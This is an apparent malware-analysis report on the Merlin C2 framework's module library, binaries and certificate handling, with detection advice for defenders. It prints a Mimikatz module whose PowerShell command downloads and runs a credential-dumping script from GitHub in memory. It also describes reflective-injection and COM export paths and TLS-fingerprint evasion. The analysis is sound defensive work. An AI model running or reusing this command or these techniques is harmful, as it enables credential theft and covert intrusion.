(2) **39 of 63 modules declare both a `remote` and a `local` path, and no field in the schema resolves which runs** — while the `local` path is empty in the distribution, so what looks like an ambiguity of behaviour is an ambiguity of meaning. The `"remote"`-key count of 61 exceeds the 47 that carry a GitHub URL — meaning some modules declare a `remote` field that does not point at GitHub. ### 1.6 The fourth correction: the pinning split is 42 floating to 3 pinned

The brief says "several use `master`, one uses a gist with a fixed rev — **that difference matters**." **The difference is real and the brief understated it: there are three pinned gists, not one.** Measured over the 48 unique URLs:

| Ref class | Unique URLs | Pinned? |
|---|---|---|
| `/master/` | **44** | no — mutable branch |
| `/beta-1.0/` | **1** | no — mutable branch tag |
| gist, `/raw/<40-char-sha>/` | **3** | **yes — immutable revision** |

[source: per-URL ref-segment classification across all 63 modules; §3.2 carries the full derivation]

**At module level the ratio is 42 floating to 3 pinned** (§3.0.1). **`beta-1.0` is a branch tag and therefore mutable in exactly the way `master` is**, so it is not the reproducibility control the brief expected.

**The consequence is stronger than "several use master": 42 of 45 remote entries execute code that its author can change after distribution, and the change propagates to every deployment silently.** One further point the brief did not anticipate: **the three pinned gists are pinned by accident of paste** — the Gist UI hands out revision-specific URLs — so there is no reproducibility policy in this library, only three incidental exceptions to its absence. §3.2 develops that.

I am treating this as the report's second headline, and it is the form I carry into §3.0.1: **Merlin's module library is a pointer set, not a payload set, and no static analysis of the archive can bound what executes.**

### 1.7 Method and coverage boundary

**What was read:** all 63 module JSONs (full parse of the `remote`/`local`/`lang`/`privilege`/`name` fields; URL extraction across every body); all four placeholder READMEs in full; `data/modules/README.MD` (12,036 B); the file inventory of `data/bin`; and header/string evidence from the binaries under §4's constraint.

**What was not read:** the 15 binaries' code (static header and string evidence only — no disassembly, pending REA sequencing); `data/src` and `data/x509` beyond their READMEs, because there is nothing else there; the extracted `CHANGELOG.MD` beyond targeted search.

**Absence probes carry working positive controls.** Three absences are asserted in this report. Each is stated with the control that proves the probe functions:

| Absence | Probe | Positive control | Where |
|---|---|---|---|
| No pinned-commit URLs | ref-segment extraction → 87 `master`, 1 tag, **0 SHA** | same extraction returned **88** total occurrences | §1.6, §3.3 |
| No certificates in `x509/` | recursive enumeration → **1 file**, the 98-B README | enumeration returned **17** files in `bin/` and **64** in `modules/` under the same command | §1.3, §5 |
| No third-party source in `src/` | recursive enumeration → **1 file**, the 126-B README | same | §1.3, §5 |

A search returning nothing is not evidence of nothing unless the same search demonstrably returns something. All three pass.

**Verified versus inferred.** Statements of fact in this report are tagged `[source: path:line]` or `[source: enumeration command]`. Where I reason from verified code to an unexecuted runtime consequence, it is marked **inferred** — as in D3's activity-stacking and Doze marks. §2.6 and §2.7 use that marking heavily.

**Hard constraints observed:** nothing in the extracted tree was executed, loaded, or invoked. No REA/Ghidra calls were made. No network requests were issued to any URL named in this report — the URLs are read as strings, not fetched.

### 1.8 What this report exists to carry

1. **Merlin's module library is a loader stub, not a payload set** (§2). 47 of 63 modules fetch their executable content from GitHub at run time.
2. **Nothing is pinned** (§1.6, §3.3). 87 `master` refs and 1 mutable branch tag; zero commit SHAs. Executed code is not reproducible and can be changed under the operator by a third party.
3. **The `remote`/`local` duality is inert cargo, not a load-time decision** (§2.6). For all 44 fetch modules the choice was made at authoring time: the URL is hardcoded inside `commands[]`, the field that executes. `SourceRemote`/`SourceLocal` ride along in the protobuf and are read by nothing on the execution path.
4. **A misspelled `lang` value proves no validation exists for that field** (§2.5) — and the server binary's four validation strings confirm `lang`, `remote`, `local`, `privilege`, and `commands` are checked by nothing.
5. **The distribution ships no certificates and no third-party source** (§5) — both are runtime-generated, so the crypto is machinery without instances.

## 2. THE MODULE LIBRARY — ARCHITECTURE AND THE TWO-PATH LOADER

### 2.1 The distribution is a loader, and the schema says so

The library README states the design intent in the schema documentation itself:

> `remote` | string | The remote path where the script associated with the module can be found
> `local` | array of strings | The local file system path where the script associated with the module can be found

[source: `data/modules/README.MD:27-28`]

and, in the same document:

> **NOTE: The remote functionality is not yet implemented**

[source: `data/modules/README.MD:54`]

**This is the crux of §2 and it required care to resolve correctly.** The project's own documentation claims the remote path is unimplemented. The shipped modules are full of GitHub URLs. Both statements are true, and the resolution is that they describe **different mechanisms**:

| Mechanism | Field | Status per the project |
|---|---|---|
| Loader-level remote fetch | `remote` | **not implemented** — vestigial |
| Script-level remote fetch | `commands[]` | **shipped and live** — a `DownloadString` call |

### 2.2 The proof: where the URL actually lives

Counting modules whose GitHub URL appears inside the `commands` array (the array that is executed) versus only in the `remote` field:

| Location of the URL | Modules |
|---|---|
| Inside `commands` **and** in `remote` | **42** |
| Inside `commands` **only** | **2** |
| In `remote` **only** | **0** |

[source: regex match for `"commands"[\s\S]*?raw\.githubusercontent` versus `"remote"[^,]*raw\.githubusercontent` across all 63 module JSONs]

**All 44 URL-bearing modules carry the URL inside `commands`. Zero depend on `remote` alone.** The `remote` field is decorative; the execution path is the command string.

### 2.3 The canonical example, in full

`data/modules/windows/x64/powershell/powersploit/Invoke-Mimikatz.json` is the brief's cited case and the clearest instance. Read in full (40 lines):

```json
"type": "standard",                          // :3
"name": "Invoke-Mimikatz",                   // :4
"platform": "windows",
"arch": "x64",
"lang": "PowerShell",                        // :10
"privilege": true,                           // :11
"remote": "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1",   // :13
"local": ["data","src","PowerSploit","Exfiltration","Invoke-Mimikatz.ps1"],  // :14
"commands": [                                // :22
  "powershell.exe",                          // :23
  "-nop",                                    // :24
  "-WindowStyle",                            // :25
  "0",                                       // :26
  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1');",  // :27
  "Invoke-Mimikatz",                         // :28
  "{{DumpCreds.Flag}}",                      // :29
  "{{DumpCerts.Flag}}",                      // :30
  "{{Command}}",                             // :31
  "{{ComputerName}}"                         // :32
]
```

[source: `data/modules/windows/x64/powershell/powersploit/Invoke-Mimikatz.json:1-40`, read in full]

**The mechanism, stated precisely.** The agent spawns `powershell.exe -nop -WindowStyle 0` (`:23-26`), then executes the string at `:27`, which is `IEX (New-Object Net.WebClient).DownloadString('<github-url>')`. `IEX` is Invoke-Expression — it evaluates the downloaded text **as PowerShell source, in memory**. The script never touches disk on the host. `:28` then calls `Invoke-Mimikatz` with the operator's option flags substituted from the `{{...}}` placeholders by the server-side templating documented at `README.MD:141-159`.

Three properties follow directly:

1. **The executed code is not in the repository.** The JSON is a stub. Only `commands[]` ships; the 40 KB+ of Mimikatz goes over HTTPS from GitHub at run time.
2. **The `local` path at `:14` does not exist.** `data/src/` is an empty placeholder (§1.3), so the fallback would fail if selected. §2.6 covers which wins.
3. **`:27` and `:13` are the same URL**, duplicated. The author wrote it into the command by hand rather than interpolating `{{remote}}`. That duplication is *why* the unimplemented `remote` field is invisible in practice.

### 2.4 The schema, and the near-uniform shape of the library

There is no JSON Schema file; validation is by convention, documented in `README.MD:10-31`. Required: the `base` object (`README.MD:5-5`, *"Every module must have the `base` object"*). Fields within `base`:

| Field | Type | Notes |
|---|---|---|
| `name` | string | required |
| `type` | string | `standard` \| `extended` — see below |
| `author` / `credits` | array of strings | provenance |
| `path` | array of strings | mirrors the directory layout |
| `platform` / `arch` / `lang` | string | **matched as raw strings** — §2.5 |
| `privilege` | bool | elevated-required flag |
| `remote` | string | the unimplemented loader path |
| `local` | array of strings | server-side path |
| `options` | array of objects | `{name,value,required,flag,description}` |
| `description` | string | |
| `commands` | array of strings | **the executed payload** |

[source: `data/modules/README.MD:10-31`, `:78-84`]

**`type` has exactly two values** and the distinction is architectural, not cosmetic:

- **`standard`** — *"does not leverage any Go packages or functions from the `pkg/modules` directory"*; it runs host programs and commands. Example given: `data/modules/linux/x64/bash/exec/bash.json`. [source: `README.MD:37-42`]
- **`extended`** — *"DOES leverage code from an associated package `pkg/modules`"*; the example is `sRDI.json`, which calls exported functions from `pkg/modules/srdi/srdi.go`. The requirement is explicit: *"Extended function must be programmed into the `getExtendedCommand()` function in `modules.go`".* [source: `README.MD:44-50`]

**The `extended` description names two internal Go source paths and a function name** — `pkg/modules/`, `pkg/modules/<function>`, `Parse()`, and `getExtendedCommand()` in `modules.go`. That is the loader's own address, documented in the distribution. §2.5 uses the `lang` matching behaviour to characterise that loader without reading the binary.

### 2.6 Remote versus local: preference, fallback, or flag?

**First, the architectural correction that reframes this whole section.** The remote-fetch URLs are **not in the agent binary**. The lead searched `merlinAgent-Windows-x64.exe` and found zero hits; I independently confirmed **zero `raw.githubusercontent.com` hits in `merlinServer-Windows-x64.exe`** as well, against a control of 3,547 `merlin` and 346 `module` hits in the same file. [source: literal byte search of both binaries]

**So the URLs exist only in the JSON module data.** That is the correct architecture and it is worth stating plainly:

```
merlinServer  ──reads──>  data/modules/**/*.json   (the library, on the SERVER)
      │
      │  agent asks the server to run a module (gRPC RunModule)
      ▼
merlinAgent   ──receives a command string──>  executes it locally
                                               (which is where DownloadString fires)
```

**The agent never knows a module exists.** It asks the server for work; the server serves a command string built from the module JSON; the fetch is performed *by the agent, on the target*, at the moment the command executes. The loader — the thing that reads the JSON and decides what to send — is server-side.

**The server-side loader, recovered from the binary.** The RPC service exposes three module entry points: [source: `merlinServer-Windows-x64.exe`, `pkg/services/rpc` symbol extraction]

| Function | Role |
|---|---|
| `(*Server).GetModule` | fetch one module by name |
| `(*Server).GetModuleList` | enumerate available modules |
| `(*Server).RunModule` | task the agent with a module |
| `getExtendedCommand` | **resolve an `extended` module to its Go implementation** |

**`getExtendedCommand` is the answer to the brief's question, and it exists exactly where the README said it would** (`README.MD:44-50`: *"Extended function must be programmed into the `getExtendedCommand()` function in `modules.go`"*). It appears twice in the server binary's symbol table.

**The `Module` protobuf type, recovered field-by-field.** The gRPC message is `rpc.Module` in `pkg/rpc`, with these accessors present: [source: `merlinServer-Windows-x64.exe`, `pkg/rpc.(*Module).Get*` extraction]

```
GetName  GetPath  GetPlatform  GetArch  GetLang  GetPriv
GetAuthor  GetCredits  GetDescription  GetNotes
GetCommands  GetOptions  GetExtended
GetSourceLocal  GetSourceRemote
```

**Note the field names the binary actually uses: `SourceLocal` and `SourceRemote`** — not `Local`/`Remote`, and with `json:"local"` / `json:"remote"` tags. So the JSON keys are the short forms and the Go fields are the long ones.

### 2.6.1 The answer: not a preference, not a fallback, not a flag

**Verified: there is no selector field.** No module in the set carries a runtime switch choosing between `remote` and `local`, and the `Module` message has no boolean or enum for it. [source: field inventory across all 63 modules; `rpc.Module` accessor list above]

**What the server does with the two fields is not resolved by static string evidence alone**, and I will not assert it. What *is* established:

1. The **`remote` branch is documented as unimplemented** (`README.MD:54`), and `validateModule` does not check either field — so a module with a broken `remote` loads without complaint.
2. **`getExtendedCommand` is the only path that inspects module internals to build a command**, and it is scoped to `extended` modules (the ones calling into `pkg/modules/`), not to `standard` ones.
3. For the **44 `standard` PowerShell modules, the disposition is decided at authoring time**: the author wrote a `DownloadString` into `commands[]` by hand. Nothing at load time chooses anything. This is verified — the URL is inside `commands` in all 44, and `{{local}}` appears in no module.

**So the practical answer, which is the one that matters operationally: the choice is made when the JSON is written, not when it is loaded.** For `standard` modules the loader is a pass-through — it hands `commands[]` to the agent verbatim. The `SourceRemote`/`SourceLocal` fields are **cargo**, carried in the protobuf and unread by the path that executes.

**Residual unknown, stated honestly:** whether `GetModule` or `RunModule` ever substitutes a `local` path into a command is resolvable only by reading the Go code. The function names and the empty `data/src/` directory both argue it does not for these modules, but that is inference, not observation. Recorded as R-2 in §7.

**Failure mode — closed or open?** This is the question the brief asks and the honest answer has two layers:

- **At the loader layer:** if the loader's remote branch is unimplemented as documented, it cannot fail open — it cannot attempt the fetch at all.
- **At the execution layer, which is the operative one:** the PowerShell `DownloadString` has **no fallback and no error handling**. If `raw.githubusercontent.com` is unreachable, `IEX` receives nothing and the subsequent `Invoke-Mimikatz` call fails with a command-not-found error. **Therefore the module fails closed** — no script, no execution. It does not silently substitute anything.
- **The failure is silent to the operator in one direction and loud in another:** the module does not report "I could not fetch." The error surfaces as a PowerShell failure on the host and returns through the agent as command output. **An operator on an air-gapped or egress-filtered target sees a module that does not work, with no indication that a network fetch was the reason.**

**The detection consequence is the important one.** A module that fetches at run time **fails closed and therefore fails visibly on any target that blocks `raw.githubusercontent.com`** — which is most enterprise egress policies. These modules do not work on a hardened network. That both limits their operational value and gives defenders a network-level control: **blocking the GitHub raw range neutralises 44 of 63 modules outright.**

### 2.7 The 13 non-GitHub `remote` values — flagged here, resolved in §3.6

60 modules carry a `"remote"` key; 45 of those hold a non-empty value (44 `raw.githubusercontent.com` + 3 gists, with one module carrying both a `master` and a `beta-1.0` URL). ### 2.9 The type split is the library's real architecture

The `standard`/`extended` distinction is not documentation trivia. It partitions the library by **where the code comes from**:

| | `standard` (55) | `extended` (6) |
|---|---|---|
| Payload lives | on a third-party **GitHub branch** | inside `pkg/modules/` **in the server binary** |
| Fetched at | **run time, by the agent** | never — compiled into the server |
| Reproducible | **no** (§3.3) | yes — it ships |
| Server package | — | `donut`, `minidump`, `sharpgen`, `shellcode`, `socks`, `srdi`, `winapi/createprocess` |
| Detection surface | network (DNS/TLS to GitHub) | **host-only** — no network indicator |

[source: `pkg/modules/*` package enumeration from `merlinServer-Windows-x64.exe`; §3.6 cross-tabulation]

**The 6 `extended` modules are the dangerous half and the invisible half.** They require no network fetch, leave no DNS record, and execute code compiled into a signed-looking server binary. `srdi` is among them, and §4.2 shows the sRDI loader module pairs with the reflective-injection DLL.

**Conversely, the 47 fetch modules are the detectable half** — every one produces a GitHub request. **The library is cleanly split into a loud half and a quiet half, and the quiet half is 9% of it.** That asymmetry is the most operationally useful thing in this section: blocking egress catches the majority of modules but cannot touch the six that matter most.

### 3.0.1 The pinning ratio, and why blocking is necessary rather than merely effective

| Pinning of the 45 non-empty `remote` URLs | Count |
|---|---|
| **Floating on `master`** | **42** |
| Pinned to a commit hash | **3** |

[source: ref-segment classification per §3.2; the 3 pinned are the gists]

**42 of 45 float.** The measured split I report in §3.2 (44 `raw`/`master` + 1 `beta-1.0` + 3 pinned gists over 48 unique URLs) is the URL-level view; this is the module-level view of the same data. Both resolve to the same conclusion: **the archive does not contain its capability set. It contains a pointer set, resolved at run time against repositories the operator does not control.**

**Two consequences, and the second is the operational one:**

1. **A Merlin deployment in 2027 may execute different code than in 2026 with no file changing on disk and no version signal in Merlin's own release.** The archive is byte-identical; the behaviour is not.
2. **Whoever controls one of those upstream repositories controls what executes inside a Merlin agent** — and **the operator has no visibility, because Merlin ships no hash for the remote copy.** The `remote` field is a URL and nothing else: no digest, no length, no signature (§3.3).

**Therefore the detection consequence is not merely "blocking works" but "blocking is necessary":** for the 42 floating modules, **no static analysis of this archive can bound what executes.** The artifact can be fully read, hashed, and archived, and still say nothing about its own runtime behaviour. A network control is the only control that closes that gap — and it closes it only while the block holds.

**This is the sharpest statement of the report's headline, and it is the form I am carrying into §3.7 and §6:**

> **Merlin's module library is a pointer set, not a payload set. 42 of 45 remote entries float on a branch the operator does not own, the JSON records no digest, and 39 modules carry a second unselected copy. The archive cannot describe its own behaviour.**

### 3.3 The consequence, stated as a supply-chain and detection fact

**45 of 48 unique URLs resolve to a mutable branch.** (`44` master + `1` beta-1.0; the 3 gists are pinned.) The ref-segment distribution confirms there is **no commit SHA anywhere in the `raw.githubusercontent.com` set**:

| Ref segment | Unique URLs |
|---|---|
| `master` | 44 |
| `beta-1.0` | 1 |
| 40-char gist revision | 3 |

**Consequences, ordered by severity:**

1. **Executed code is not reproducible.** An operator who runs `Invoke-Mimikatz` today and tomorrow may execute different bytes both times, with no version record on either side. Nothing in the module pins what ran.
2. **A third party controls the executed payload.** The repositories are owned by the tools' authors, not by the Merlin project or the operator. A force-push, a compromised maintainer account, or a deleted-and-recreated branch changes what every deployment of that module executes.
3. **There is no integrity check.** No hash, no signature, no expected-length field. `IEX (New-Object Net.WebClient).DownloadString(...)` evaluates whatever arrives. **TLS to `raw.githubusercontent.com` is the only integrity control in the entire chain** — and it authenticates GitHub, not the script author.
4. **The supply chain is transitive and unbounded.** Several entries point at `Empire`/`PowerSploit` payloads that themselves may fetch or load further content; the fetched script is not constrained by the JSON that named it.

**I am not asserting that any of these repositories has been compromised.** The claim is structural: *this design makes compromise of any of 45 upstream branch URLs sufficient to execute arbitrary code on every deployment of the affected module, with no mechanism in Merlin to detect or prevent it.*

### 3.7 Defender-facing summary

**Network indicator:** DNS and TLS to `raw.githubusercontent.com` and `gist.githubusercontent.com`, originating from a **victim endpoint or a compromised server**, at module-execution time.

**Why it is high-fidelity:** legitimate endpoints fetch GitHub raw content through package managers, CI, and `git`, not from an agent process invoking `IEX`, `curl`, or `wget` at operator command time. A `raw.githubusercontent.com` request originating from a host that has no developer tooling is a strong indicator, and **the request happens at the moment the operator runs the module**, not at implant deployment.

## 4. THE AGENT AND CLI BINARIES — STATIC IDENTITY

### 4.1 A correction to the brief: the `.c` and `.def` files are not empty, and that matters

The brief states that `merlin.c` and `merlin.def` in `data\bin\` are **both 0 bytes**, and reasons from that to the conclusion that they are the empty stubs Go's `buildmode=c-archive` emits. **They are not empty. I read both, in full, and verified their bytes twice with independent methods.**

| File | Size | SHA-256 (prefix) | First 16 bytes | Decodes to |
|---|---|---|---|---|
| `data/bin/merlin.c` | **1,642 B** | `9C6806FC76015DC4968DB2F38D9E13BA…` | `23 69 6e 63 6c 75 64 65 20 3c 77 69 6e 64 6f 77` | `#include <window` |
| `data/bin/merlin.def` | **882 B** | `3E634445666C4091A740483826345B12…` | `3b 20 6d 65 72 6c 69 6e 2e 64 65 66 20 2d 20 6d` | `; merlin.def - m` |

[source: `Get-Item` size, `Get-FileHash -Algorithm SHA256`, and raw byte read of both files at `05_TARGETS/merlin_extracted/data/bin/`]

**Probe validity, since this asserts a negative and a discrepancy.** Two things could make the "0 bytes" reading correct and mine wrong, and I ruled out both:

1. **A second, empty copy elsewhere in the tree.** Recursive enumeration of all of `RE_Library` for the filenames `merlin.c` and `merlin.def` returns **exactly four files — two locations, each one copy of each name, all four identical in size**: the extraction at `05_TARGETS/merlin_extracted/` and the earlier extraction at `07_OUTPUT/extractions/T8/extracted/`. There is no empty copy anywhere. [source: recursive filename enumeration across the whole library]
2. **A read that silently returned nothing.** The byte-level read returns real content and the ASCII decodes to the file's own opening line in each case — `#include` for the C file, `; merlin.def - m…` for the definition file. **A 0-byte file cannot produce those bytes.**

**The conclusion the brief drew is therefore not supported — but the correction it was reaching for is still correct, and I am keeping it.** The DLL *is* Go, not C (§4.4). What changes is *why*:

> **Go's `buildmode=c-archive` emits generated `.c` and `.def` stubs. Merlin's `data/bin/` does not contain those stubs — it contains a hand-written `merlin.c` and a hand-written `merlin.def`, alongside a Go DLL.** The directory mixes three artifact classes under C-looking names.

**Both files are substantive, and neither is boilerplate.** §4.2 and §4.3 read them; the short version is that `merlin.c` contains the reflective-injection export chain and `merlin.def` documents a specific Go 1.27 × i686 toolchain break. **A pair of empty stubs could not contain either.** The distinction is not pedantic: a reader who believes these are generated stubs skips two of the most informative files in `data/bin/`, and specifically misses the COM export list and the `Magic`→`Merlin` linkage.

**On the naming inversion, I agree with the brief and it stands** — see §4.4. What follows is the corrected version of their sentence:

> **The DLL is Go. `merlin.c` is real C that is not the DLL's implementation, and `merlin.def` is a real build fix. The naming points at C; the content is Go plus a hand-written C shim.**

**A method note, offered as a correction to the record rather than as a criticism.** The brief's evidence block and this section disagree on a directly measurable property — file size — and the disagreement was resolvable in one command. When a report corrects another report, the correction itself carries the same risk it is describing, so the size figures above are given with hashes and byte heads rather than as a bare claim. **A 0-byte assertion and a 1,642-byte assertion cannot both be right, and only one of them survives a hash.**

### 4.2 `merlin.c` — the reflective-injection entry point

`merlin.c` is the DLL's C entry point. It is not a stub and it is not generated boilerplate — it is hand-written, commented, and it carries the injection contract:

- `DllMain(HINSTANCE, DWORD, LPVOID)` — standard four-case switch; all cases are empty except comments. `DLL_PROCESS_ATTACH` deliberately does nothing but `break`. [source: `data/bin/merlin.c:7-36`]
- **`int Magic(char *url)` at `:41-45`** — calls `Merlin(url)` and returns 0. This is the exported launcher.
- The comment at `:38` states the purpose outright: *"Magic is the exported function name that can be called from sRDI to launch a Merlin agent."*
- `:39` names the Go side: *"There must be a call to an exported function from `cmd/merlinagentdll/main.go` so that the export functions are available."*

**This is a \(\text{self-describing}\) linkage chain across three artifacts**, and it is the clearest example of the corpus's reflective-loading pattern in this target:

```
sRDI  ──calls──>  Magic(url)          [merlin.c:41, C]
                      │
                      ▼
                  Merlin(url)          [cmd/merlinagentdll/main.go, Go — //export]
                      │
                      ▼
                  full Merlin agent, running in-memory in the host process
```

`sRDI` is not incidental here — it is also one of the 63 modules (`windows/x64/go/exec/sRDI.json`, an `extended` module per `README.MD:44-47`). **So Merlin ships both the sRDI loader module and the DLL that sRDI is designed to load.** The reflective-injection pair is co-designed, not assembled from parts.

### 4.3 `merlin.def` — a build-engineering document, and a Go 1.27 detail

`merlin.def` is a 22-line module-definition file whose header comment explains why explicit exports are required. Read in full, it documents a **specific toolchain break**: [source: `data/bin/merlin.def:1-22`]

> under Go 1.27 the c-archive carries standard-library symbols that `i686-w64-mingw32-ld` refuses to auto-export (*"cannot export addMulVVWx / go:buildinfo: symbol not found"*), which breaks `make 386`.

The fix is the explicit 7-symbol export list:

```
Run
VoidFunc
DllInstall
DllRegisterServer
DllUnregisterServer
Merlin
Magic
```

[source: `data/bin/merlin.def:15-22`]

**Three findings fall out of this small file:**

1. **`Go 1.27` is named as the toolchain**, matching the build info recovered from the binaries (§4.4). The `.def` and the binaries agree.
2. **The export list is the real DLL interface**, and it includes **COM registration entry points** (`DllInstall`, `DllRegisterServer`, `DllUnregisterServer`). A DLL that exports `DllRegisterServer` is a **COM/regsvr32-loadable payload** — that is a second delivery primitive alongside sRDI, and both are exported from the same binary.
3. **`Magic` and `Merlin` are exported by name**, i.e. the injection API is a stable target rather than resolved by ordinal.

### 4.4 The DLL is Go — verified, and the naming inversion is the finding

The lead verified `merlin.x64.dll` (15,145,760 B = 14.44 MB) carries **Go build info** (`go1.27.2`, 573 `github.com/Ne0nd0g/merlin` hits) and is a `buildmode=c-archive` artifact, not a C DLL. **I reproduce the size independently: 15,145,760 B.** [source: enumeration of `data/bin/`]

`merlin.x86.dll` is 14,687,006 B (14.01 MB) — the 32-bit twin whose `make 386` build the `.def` file exists to fix.

**Statement for the record:** *the DLL is Go; the naming implies C; `merlin.c` and `merlin.def` are real, non-empty, and hand-written rather than the generated stubs a c-archive normally emits.* **The artifact's name points the opposite way from its content.**

**"Peripheral" would be the wrong word for those two files, and §4.2–4.3 show why.** They are not implementation and not stubs, but they carry the **injection contract** (`Magic`→`Merlin`) and the **COM export surface** (`DllRegisterServer`, `DllInstall`). They are the smallest files in `data/bin/` and the only ones that state how the DLL is meant to be loaded. I flag the wording deliberately, because treating them as generated scaffolding is the error §4.1 corrects.

**This is the same class as the `jumper` inversion in D3 §2.1** — where a class named for a watchdog turned out to relaunch an Activity — and I am flagging the recurrence rather than treating it as a one-off. Across this corpus, **the artifact that carries a misleading name has now appeared in two independent targets**, and in both cases the name was the thing an analyst would otherwise have trusted.

All four are **README-only**. Each README is a sentence telling the operator what the directory will hold once the tool runs. `data/x509/README.MD` in full: *"# Merlin's x.509 Certificates / Generate x.509 certificates for Merlin's server and store them here."* [source: `data/x509/README.MD:1-2`]

### 5.2 The negative, with its positive control

**No certificate material ships with this distribution.** A recursive probe for `*.pem, *.crt, *.cer, *.p12, *.pfx, *.key, *.jks, *.keystore` across the entire **264,634,542-byte** extraction returns **zero files**. [source: recursive extension-filtered enumeration over `merlin_extracted/`]

**The probe is shown able to succeed on the same tree**, which is what makes the zero meaningful: [source: same enumeration method]

| Control | Matches |
|---|---|
| `*.json` | **63** |
| `*.md` | **7** |
| cert-like extensions | **0** |

**So the absence is real: 264 MB of distributed tooling contains no key, no certificate, no keystore.** The TLS stack the agent uses for JA3 impersonation (§4.6) and the `x509` machinery implied by the directory name have **no shipped instances** — both sides generate at runtime.

### 5.3 Why this matters — the consequence for analysis and for the operator

**For the analyst, it means the crypto cannot be audited from the archive.** The certificate chain, the CA, the leaf key, and the pinned-material question are all resolved at deployment. A defender holding this archive cannot determine what the server will present, whether certificates are self-signed, or whether the agent pins anything — **because none of it exists yet.**

**It also means the `x509` directory name is a promise rather than a datum**, the third instance of that pattern in this target:

| Artifact | Name implies | Actually is |
|---|---|---|
| `merlin.x64.dll` | a C DLL | Go `c-archive` (§4.4) |
| `data/src/` | third-party source shipped | empty placeholder (§1.3) |
| `data/x509/` | certificates shipped | empty placeholder (§5.1) |

**For the operator, the same fact is the security-relevant one and it runs the other way.** Because Merlin generates its certificates on first run rather than shipping a pinned pair, **every deployment has a unique, unvalidated certificate** — there is no pinned material for an operator to verify against, and no shipped key for an attacker to steal. That cuts against the AndroRAT finding in D3 §10.2, where the distribution shipped the private half of its signing key. **Merlin's problem is the inverse: nothing to steal, but also nothing to trust and nothing that third parties can pin.**

**The consequence for the detection story is worth stating because it closes a loop with §3.** A defender cannot write a certificate-based detection rule for Merlin from this archive, **but does not need one**: the module library's GitHub fetches (§3) are unencrypted-at-the-application-layer *and* authenticated by GitHub's own certificate, so the observable is the hostname, not the certificate. **Merlin's runtime-generated certs are actually its weakest link for defenders — and its GitHub fetches are its loudest.**

### 5.4 `data/src/` — the empty half of the 39

`data/src/README.MD` says: *"# Merlin 3rd Party Source Code / This directory will hold the source code for 3rd party tools used by Merlin and/or its agents."* It is **empty**. [source: `data/src/README.MD:1-3`; enumeration]

**This connects directly to the §3.0 shape finding and makes it worse.** 39 modules declare both a `remote` URL and a `local` array — and the `local` arrays point into **this empty directory**. So the "local copy" that makes the 39 ambiguous is a copy **that does not exist in the distribution**:

```
"remote": "https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1"   ← resolves
"local":  ["data","src","PowerSploit","Exfiltration","Invoke-Mimikatz.ps1"]  ← does not exist
```

[source: `data/modules/windows/x64/powershell/powersploit/Invoke-Mimikatz.json:13-14`; `data/src/` enumeration]

**The ambiguity in the JSON is therefore not a live ambiguity about which program runs — it is an ambiguity about what the field means.** The `local` path documents where the file *would* sit if an operator had populated `data/src/`, which the shipped archive never does. One of the two programs the module nominally offers is **absent from the distribution**, so on a fresh install the only resolving branch is the fetch.

**That does not make §3.0's finding go away — it sharpens it.** The `remote`-versus-`local` question still cannot be answered from the JSON (§2.6 — no selector field, nothing validated), but the *shipped* state removes one branch in practice. **The residual risk is the operator who does populate `data/src/`**: an operator-supplied `PowerSploit/Exfiltration/Invoke-Mimikatz.ps1` differs from the upstream file fetched from `BC-SECURITY/Empire`, and **nothing in Merlin reconciles the two or records which ran.** Silent divergence between the two documented paths is the failure mode, and it is invisible in both directions.

## 6. CROSS-TARGET PLACEMENT

**Merlin is the only target in this corpus that attacks the TLS handshake itself rather than the traffic inside it.** Its eleven uTLS ClientHelloID families (§4.6) impersonate Chrome, Firefox, Safari, iOS, Android, Edge, 360, and QQ at the handshake layer, with `Randomized` variants that prevent a *stable* fingerprint across sessions — defeating the "same unusual JA3 twice" heuristic that works against every other implant here. `protocol=h2` and `useragent=Mozilla/5.0` are chosen to match those profiles. **Sliver, Covenant, Mythic, Havoc, Pupy, Metasploit, AhMyth, and AndroRAT all fingerprint as themselves; Merlin fingerprints as the browser it is hiding behind.**

**And it is now the only target shipping a runtime-fetched module library, which inverts the archive's value.** D8 documented Merlin as binary-only; the truth is that the archive is a **pointer set** (§3.0.1). 42 of 45 remote entries float on a branch the operator does not own, the JSON records no digest, and 39 modules carry a second `local` path that is empty in the distribution (§5.4). **Every other target in this corpus ships its capability set; Merlin ships references to other people's repositories.** That is why its most reliable detection is a network hostname (§3.7) rather than a file hash, and why the six `extended` modules — the only ones whose code actually ships — are the quiet half that egress filtering cannot reach (§2.9).
